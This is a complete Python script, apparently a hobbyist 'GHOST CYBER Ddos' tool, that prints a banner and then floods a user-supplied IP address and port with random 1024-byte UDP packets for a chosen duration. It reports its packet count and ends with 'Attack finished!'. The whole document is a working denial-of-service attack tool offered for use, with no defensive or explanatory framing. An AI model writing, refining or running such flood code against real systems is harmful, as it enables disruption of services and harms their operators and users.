import socket
import random
import time
import pyfiglet as pyg 
import os 

      
res= pyg.figlet_format("GHOST CYBER Ddos", font = "slant")   
    
 
os.system("echo '{0}' | lolcat".format(res))
os.system('echo "   ꧁ঔৣ☬ WELCOME TO GHOST CYber DDOS DEVloped BY MOHAMMAD FAHAD ☬ঔৣ꧂ " | lolcat')


print("‎ ")
 



sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)



ip = str(input("Target IP: "))

port = int(input("Port: "))

duration = int(input("Duration (seconds): "))

timeout = time.time() + duration

sent = 0



while True:

    try:

        if time.time() > timeout:

            break

        else:

            pass

        sock.sendto(bytes, (ip,port))

        sent = sent + 1

        print(f"Sent {sent} packets to {ip} at port {port}")

    except KeyboardInterrupt:

        break

    except socket.error as e:

        print(f"Connection Lost! Error: {e}")

        break

time.sleep(2)

print("Attack finished!")
